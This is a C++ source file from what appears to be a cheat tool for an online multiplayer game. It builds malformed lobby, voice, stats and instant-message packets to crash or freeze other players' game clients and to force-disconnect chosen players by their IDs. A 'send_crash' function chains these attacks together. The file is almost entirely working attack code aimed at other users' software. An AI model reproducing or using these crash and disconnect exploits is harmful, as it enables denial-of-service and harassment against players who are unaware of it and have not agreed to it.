#include "dependencies/std_include.hpp"
#include "exploit.hpp"

namespace exploit
{
	namespace instant_message
	{
		void send_popup(const std::vector<std::uint64_t>& recipients)
		{
			if (game::Live_IsUserSignedInToDemonware(0))
			{
				const auto dummy{ 0 };
				game::send_instant_message(recipients, 'f', &dummy, sizeof dummy);
			}
		}

		void send_info_response_overflow(const std::vector<std::uint64_t>& recipients)
		{
			if (game::Live_IsUserSignedInToDemonware(0))
			{
				char buffer[0x400] = { 0 };
				game::msg_t msg{};

				msg.init_lobby(buffer, game::MESSAGE_TYPE_INFO_RESPONSE);

				uint32_t dummy{ 0 };
				game::LobbyMsgRW_PackageUInt(&msg, "nonce", &dummy);
				game::LobbyMsgRW_PackageInt(&msg, "uiscreen", reinterpret_cast<int*>(&dummy));
				game::LobbyMsgRW_PackageUChar(&msg, "nattype", reinterpret_cast<uint8_t*>(&dummy));

				game::LobbyMsgRW_PackageArrayStart(&msg, "lobbies");
				msg.write(12ui8);

				game::send_instant_message(recipients, 'h', msg);
			}
		}

		void send_friend_message_crash(const std::vector<std::uint64_t>& recipients)
		{
			const game::JoinSessionMessage message{ game::JOIN_REQUEST };
			game::send_instant_message(recipients, 'f', &message, sizeof message);
		}
	}

	namespace lobby_msg
	{
		void send_disconnect(const game::LobbySession* session, const std::uint64_t xuid)
		{
			if (session == nullptr)
				return;
			
			char buffer[0x20000] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_LOBBY_CLIENT_DISCONNECT);
			
			int lobby_type = session->type;
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &lobby_type);
			uint64_t target_xuid = xuid;
			game::LobbyMsgRW_PackageXuid(&msg, "xuid", &target_xuid);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, session->host.info.netAdr, session->host.info.xuid);
		}
		
		void send_disconnect_client(const game::LobbySession* session, const std::uint64_t xuid)
		{
			if (session == nullptr)
				return; 
			
			char buffer[0x20000] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
			
			uint32_t data_mask{ 4u };
			game::LobbyMsgRW_PackageUInt(&msg, "datamask", &data_mask);
			int lobby_type = session->type;
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &lobby_type);
			uint64_t target_xuid = xuid;
			game::LobbyMsgRW_PackageXuid(&msg, "discclientxuid", &target_xuid);
			int disconnect_type = game::LOBBY_DISCONNECT_CLIENT_BADDLC;
			game::LobbyMsgRW_PackageInt(&msg, "discclient", &disconnect_type);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, session->host.info.netAdr, session->host.info.xuid);
		}

		void send_connection_test(const game::LobbySession* session, const game::netadr_t& netadr, const std::uint64_t xuid)
		{
			if (const auto our_client_num = game::LobbySession_GetClientNumByXuid(session, game::LiveUser_GetXuid(0)); our_client_num >= 0)
			{
				char buffer[0x400] = { 0 };
				game::msg_t msg{};

				msg.init_lobby(buffer, game::MESSAGE_TYPE_PEER_TO_PEER_CONNECTIVITY_TEST);
				
				int lobby_type = session->type;
				game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &lobby_type);
				int index = our_client_num;
				game::LobbyMsgRW_PackageInt(&msg, "index", &index);

				events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_PEER_TO_PEER, msg, netadr, xuid);
			}
		}

		void send_modified_stats_crash(const game::netadr_t& netadr, const std::uint64_t xuid)
		{
			char buffer[0x200] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_LOBBY_MODIFIED_STATS);
			
			int stats_size = 0x20000;
			game::LobbyMsgRW_PackageInt(&msg, "statssize", &stats_size);
			char stats_buffer[0x100] = { 0 };
			game::LobbyMsgRW_PackageGlob(&msg, "statsbuffer", &stats_buffer, sizeof stats_buffer);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, netadr, xuid);
		}

		void send_voice_packet_crash(const game::netadr_t& netadr, const std::uint64_t xuid)
		{
			char buffer[0x400] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_VOICE_PACKET);

			int dummy{ 0 };
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &dummy);
			game::LobbyMsgRW_PackageUChar(&msg, "talker", reinterpret_cast<uint8_t*>(&dummy));
			game::LobbyMsgRW_PackageInt(&msg, "relaybits", &dummy);
			uint16_t voice_data_size = 1198 + sizeof(uint32_t);
			game::LobbyMsgRW_PackageUShort(&msg, "sizeofvoicedata", &voice_data_size);
			game::LobbyMsgRW_PackageUChar(&msg, "numpackets", reinterpret_cast<uint8_t*>(&dummy));
			char voice_data_buffer[0x100] = { 0 };
			game::LobbyMsgRW_PackageGlob(&msg, "voicedata", &voice_data_buffer, sizeof voice_data_buffer);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, netadr, xuid);
			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_PEER_TO_PEER, msg, netadr, xuid);
		}

		void send_state_game_crash(const game::netadr_t& netadr, const std::uint64_t xuid)
		{
			char buffer[0x800] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_LOBBY_STATE_GAME);

			game::Msg_LobbyStateGame data{};
			data.core.lobbyMode = game::LOBBY_MODE_CUSTOM;
			data.compressedBufferSize = 0x20000;
			game::call(game::base_address + 0x1ED4810, &data, &msg);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_CLIENT, msg, netadr, xuid);

			char buffer2[0x2000] = { 0 };

			msg.init_lobby(buffer2, game::MESSAGE_TYPE_LOBBY_STATE_GAME);

			for (size_t i = 0; i < sizeof(buffer2) - 0x100; i++)
			{
				msg.write(0xffui8);
			}

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_CLIENT, msg, netadr, xuid);
		}

		void send_join_lobby_crash(const game::netadr_t& netadr, const std::uint64_t xuid)
		{
			char buf[0x800] = {};
			game::msg_t msg = {};

			msg.init_lobby(buf, game::MESSAGE_TYPE_JOIN_LOBBY);

			game::Msg_JoinParty data{};
			data.memberCount = 0x20000;
			game::call(game::base_address + 0x1EE1110, &data, &msg);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, netadr, xuid);
		}
		
		void send_server_info_overflow(const game::netadr_t& netadr, const std::uint64_t xuid)
		{
			char buffer[0x400] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_SERVERLIST_INFO);

			uint8_t platform{ 0 };
			game::LobbyMsgRW_PackageUChar(&msg, "platform", &platform);

			game::LobbyMsgRW_PackageArrayStart(&msg, "lobbies");
			msg.write(12ui8);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_CLIENT, msg, netadr, xuid);
		}
	}
	
	void send_connect_response_migration_packet(const game::netadr_t& netadr)
	{
		PRINT_LOG("Sending connectResponseMigration packet to %s", utils::get_sender_string(netadr).data());
		game::net::oob::send(netadr, "connectResponseMigration");
	}
	
	void send_mstart_packet(const game::netadr_t& netadr)
	{
		PRINT_LOG("Sending mstart packet to %s", utils::get_sender_string(netadr).data());
		game::net::oob::send(netadr, "mstart");
	}

	void send_request_stats_packet(const game::netadr_t& netadr)
	{
		PRINT_LOG("Sending requeststats packet to %s", utils::get_sender_string(netadr).data());
		game::net::oob::send(netadr, "requeststats\n");
	} 

	void send_crash(const game::netadr_t& netadr, const std::uint64_t xuid, const bool freeze)
	{
		PRINT_LOG("Sending crash packets to %s", utils::get_sender_string(netadr).data());
		
		if (freeze)
		{
			lobby_msg::send_server_info_overflow(netadr, xuid); 
			instant_message::send_info_response_overflow({ xuid });
		}
		else
		{
			game::net::netchan::send(game::NETCHAN_VOICE, "relay", netadr, xuid);
			game::net::oob::send(netadr, "relay");
			game::net::oob::send(netadr, "vt");

			instant_message::send_friend_message_crash({ xuid });

			lobby_msg::send_modified_stats_crash(netadr, xuid);
			lobby_msg::send_voice_packet_crash(netadr, xuid);
			lobby_msg::send_state_game_crash(netadr, xuid);
			lobby_msg::send_join_lobby_crash(netadr, xuid);
		}
	}
}